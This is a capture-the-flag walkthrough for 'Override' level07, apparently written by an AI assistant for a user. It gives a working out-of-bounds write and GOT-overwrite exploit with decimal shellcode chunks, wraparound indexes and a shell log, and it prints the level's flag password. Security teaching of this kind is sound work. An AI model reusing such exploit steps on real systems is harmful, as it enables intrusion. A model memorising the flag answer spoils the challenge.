That makes perfect sense. Overwriting the **Global Offset Table (GOT)** entry for `fflush` is a smart move because `fflush(stdout)` is called inside `get_unum` every time the program asks for input. This creates an immediate trigger for your shellcode without needing to exit the main loop.

Here is the corrected walkthrough reflecting your specific **GOT overwrite strategy**.

---

# Override — Level07 Walkthrough

## 1. Initial Behavior

The binary `level07` allows users to **store** and **read** integers in an array.

```bash
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------

```

The `store_number` function imposes a rule: you cannot write to indexes that are multiples of 3 (e.g., 0, 3, 6).

## 2. Detecting the Vulnerability

The program checks `index % 3 == 0` but **fails to check the upper bound** of the index. This allows an **Out-of-Bounds (OOB) Write**.

By providing a massive index (integer overflow), we can wrap around the 32-bit address space. This allows us to:

1. Write to "reserved" indexes (like 0) by finding an overflowing value that isn't a multiple of 3.
2. Write to arbitrary memory locations outside the stack frame, such as the **Global Offset Table (GOT)**.

## 3. The Exploit Strategy

Instead of targeting the return address (which requires quitting the program), we target the **GOT entry of `fflush**`.

* **Why `fflush`?** The function `get_unum` calls `fflush(stdout)` before every input.
* **The Plan:**
1. Fill the array on the stack with shellcode.
2. Use the OOB write to change the `fflush` GOT entry to point to the start of our array.
3. The next time the program asks for input, it calls `fflush`, which jumps to our shellcode.



## 4. Calculating Offsets

Based on crash analysis and debugging:

* **Array Address:** `0xffffd574` (Where our shellcode will live).
* **Target (GOT overwrite):** Accessed via index `33632936`.
* **Shellcode Storage:** Accessed via overflowing indexes (like `2147483648`) to bypass the "multiple of 3" check for the start of the array.

## 5. Crafting the Payload

We convert the shellcode into decimal chunks and use the `store` command. The final step is writing the array's address (`0xffffd574` -> `4294956404`) into the `fflush` GOT location.

| Description | Decimal Input | Index Used |
| --- | --- | --- |
| **Shellcode Chunk 1** | `1750122545` | `2147483648` (Wraps to 0) |
| **Shellcode Chunk 2** | `1752379183` | `1` |
| **Shellcode Chunk 3** | `1768042344` | `2` |
| **Shellcode Chunk 4** | `1357089134` | `2147483651` (Wraps to 3) |
| **Shellcode Chunk 5** | `2967570771` | `4` |
| **Shellcode Chunk 6** | `8441099` | `5` |
| **GOT Overwrite** | `4294956404` | `33632936` |

## 6. Exploitation

We execute the store commands. As soon as the final store is complete, the program loops around to ask for a command again. This triggers `fflush`, executing our shellcode.

```bash
Input command: store
 Number: 1750122545
 Index: 2147483648
 ...
Input command: store
 Number: 4294956404  # Address of array (0xffffd574)
 Index: 33632936     # Offset to fflush GOT
 Completed store command successfully
 # The loop continues, fflush is called, and shell spawns immediately.
$ whoami
level08

```

## 7. Retrieving the Password

```bash
cat /home/users/level08/.pass

```

**Output:**

```text
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

```

---

## 🏁 Final Password

```text
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

```